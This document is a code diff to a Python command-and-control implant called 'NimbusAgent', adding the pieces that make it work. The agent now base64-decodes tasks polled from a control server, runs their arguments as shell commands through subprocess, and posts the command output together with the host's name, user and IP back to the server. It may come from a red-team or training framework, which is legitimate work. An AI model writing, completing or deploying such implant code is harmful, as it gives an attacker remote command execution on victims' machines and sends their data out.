@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import argparse
+import base64
 import getpass
 import hashlib
 import json
@@ -8,6 +9,7 @@ import logging
 import os
 import random
 import socket
+import subprocess
 import sys
 import time
 import platform
@@ -41,6 +43,8 @@ class NimbusAgent:
         self.external_ip = self.get_external_ip()
         self.sleep_interval = ""
         self.kill_date = ""
+        self.task = ""
+        self.task_output = ""
 
     def get_session_id(self):
         """
@@ -148,35 +152,50 @@ class NimbusAgent:
 
         return tasking
 
-    def post_tasking_output(self, task_output):
+    def post_tasking_output(self, task, task_output):
+
         post_task_url = URL + "out"
-        tasking = ""
-        logging.debug(f"sending post_tasking_output request to: {post_task_url}")
+
+        self.task = task
+        self.task_output = task_output
+
+        logging.debug(
+            f"sending post_tasking_output request to: {post_task_url}")
         try:
-            # convert agent class members to JSON and URL encode
-            post_data = parse.urlencode(task_output).encode()
+            # convert agent class members to JSON
+            post_data = json.dumps(self.__dict__)
 
             # send POST request to control server
-            req = request.Request(post_task_url, data=post_data)
+            req = request.Request(post_task_url, bytes(post_data, "utf-8"))
             resp = request.urlopen(req)
 
             # read response
             html = resp.read()
-            tasking = html.decode("utf-8")
-            logging.debug(tasking)
+            response = html.decode("utf-8")
+            logging.debug(response)
+
         except Exception as e:
             logging.error(e)
+            self.task = ""
+            self.task_output = ""
             return ""
 
-        return tasking
+        self.task = ""
+        self.task_output = ""
 
+    def exec_tasking(self, task):
+        logging.debug("sending task to appropriate handler")
 
-    def exec_tasking(self, task, arguments):
-        logging.warning("sorry, this function is not implemented")
+        output = ""
+        if task["task"] == "exec-cmd":
+            output = exec_cmd(task)
 
-def extract_task_and_arguments(task):
-        logging.warning("sorry, this function is not implemented")
-        return "", [""]
+        else:
+            logging.warning("received invalid task command:")
+            print(task["task"])
+
+        return output
+
 
 def derive_session_id(hostname: str, user: str, cwd: str, agent_pid) -> str:
     """
@@ -187,6 +206,21 @@ def derive_session_id(hostname: str, user: str, cwd: str, agent_pid) -> str:
     seed = hostname + user + cwd + str(agent_pid)
     session_id = hashlib.md5(seed.encode('utf-8')).hexdigest()
     return session_id
+
+
+def decode_task(task):
+    logging.debug("base64 decoding agent task")
+
+    # base64 decode the task
+    try:
+        decoded = base64.b64decode(task)
+    except Exception as e:
+        logging.error(e)
+        return ""
+
+    # convert the task to dict
+    decoded = json.loads(decoded.decode("utf-8"))
+    return decoded
 
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=
@@ -201,8 +235,27 @@ def upload_file(url, src):
     return "sorry this feature is not implemented"
 
 
-def exec_cmd(cmd):
-    return "sorry this feature is not implemented"
+def exec_cmd(task):
+
+    output = ""
+
+    cmd = task["arguments"]
+    cmd = ' '.join(cmd)
+
+    if cmd == "":
+        logging.debug("received an empty task")
+        output = "received call to 'exec-cmd' with no arguments."
+        return output
+
+    logging.debug(f"executing task: {cmd}")
+
+    try:
+        output = subprocess.getoutput(cmd)
+    except Exception as e:
+        logging.error(e)
+        return ""
+
+    return output
 
 
 def list_files(dir):
@@ -257,7 +310,8 @@ def main(args):
     agent_settings = json.dumps(vars(agent), indent=4)
     logging.info("agent settings:")
     print(agent_settings)
-    session_id = derive_session_id(agent.hostname, agent.username, agent.agent_dir, agent.agent_pid)
+    session_id = derive_session_id(
+        agent.hostname, agent.username, agent.agent_dir, agent.agent_pid)
     print(f"session ID: {session_id}")
 
     while True:
@@ -279,13 +333,13 @@ def main(args):
             continue
         else:
             logging.debug(f"received new task: {task}")
+            task = decode_task(task)
+
+            task_output = agent.exec_tasking(task)
+
+            agent.post_tasking_output(task, task_output)
+
             return
-            cmd, task_args = extract_task_and_arguments(task)
-            task_output = agent.exec_tasking(cmd, task_args)
-            # !!!!! fix me !!!!!!
-            task_output = {"task_output": "asdsadjasldjlaksjdklasjdlkj"}
-            response = agent.post_tasking_output(task_output)
-            print(response)
 
         # sleep again
         time.sleep(agent.get_sleep_interval())
